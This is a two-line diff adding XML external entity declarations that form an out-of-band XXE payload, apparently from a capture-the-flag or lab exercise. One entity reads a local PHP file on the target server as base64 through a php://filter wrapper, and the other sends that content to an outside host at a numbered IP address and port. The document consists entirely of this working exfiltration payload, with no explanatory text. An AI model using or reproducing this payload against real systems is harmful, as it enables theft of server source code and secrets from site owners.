@@ -1,0 +1,2 @@
+<!ENTITY % resource SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/6/.letmepass.php">
+<!ENTITY % LoadOOBEnt "<!ENTITY &#x25; OOB SYSTEM 'http://10.100.13.202:7001/?p=%resource;'>">
